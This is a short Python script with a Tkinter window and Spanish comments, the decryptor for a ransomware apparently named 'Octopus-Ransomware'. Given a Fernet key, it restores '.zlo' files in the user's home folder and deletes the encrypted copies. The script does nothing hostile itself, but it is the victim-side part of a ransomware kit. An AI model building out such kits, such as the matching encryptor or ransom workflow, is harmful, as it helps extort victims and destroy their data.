from cryptography.fernet import Fernet, InvalidToken
import os
from tkinter import messagebox
import tkinter as tk

try:
    def advertencia():
        global entry, root
        root = tk.Tk()
        root.title("Decryptor for Octopus-Ransomware")

        main = tk.Label(root, text="Ingresa la password (key)...")
        main.pack(pady=10)

        entry = tk.Entry(root, width=40)  # Ocultar la clave
        entry.pack(pady=5)
        entry.bind('<Return>', lambda event: on_decrypt())

        accept_button = tk.Button(root, text="Aceptar", command=on_decrypt)
        accept_button.pack(pady=10)

        root.mainloop()

    def on_decrypt():
        key = entry.get().strip()
        if not key:
            messagebox.showerror("ERROR", "La clave no puede estar vacía.")
            return

        # Carpeta base del usuario
        PC = os.path.expanduser('~')  # Ruta de inicio del usuario
        if not os.path.exists(PC):
            messagebox.showinfo("Info", f"No se encontró la carpeta '{PC}'.")
            return

        archivos_encontrados = []
        errores = []

        for file_name in os.listdir(PC):
            file_path = os.path.join(PC, file_name)
            if file_path.endswith(".zlo"):
                try:
                    decrypt_file(file_path, key.encode())
                    archivos_encontrados.append(file_path)
                except InvalidToken:
                    errores.append(f"Clave incorrecta: {file_path}")
                except Exception as e:
                    errores.append(f"Error en {file_path}: {e}")

        # Mostrar resumen al final
        if archivos_encontrados:
            messagebox.showinfo("Éxito", f"Archivos desencriptados:\n" + "\n".join(archivos_encontrados))
        
        else:
            messagebox.showinfo("Info", "No se desencriptó ningún archivo.")
        
        if errores:
            messagebox.showerror("Errores", "Problemas encontrados:\n" + "\n".join(errores))
        


    def decrypt_file(file_path, key):
        f = Fernet(key)
        with open(file_path, "rb") as file:
            encrypted_data = file.read()
        decrypted_data = f.decrypt(encrypted_data)
        decrypted_file_path = file_path[:-4]  # Quitar extensión .zlo
        with open(decrypted_file_path, "wb") as file:
            file.write(decrypted_data)
        os.remove(file_path)

    advertencia()

except Exception as e:
    messagebox.showerror("ERROR", f'{e}')
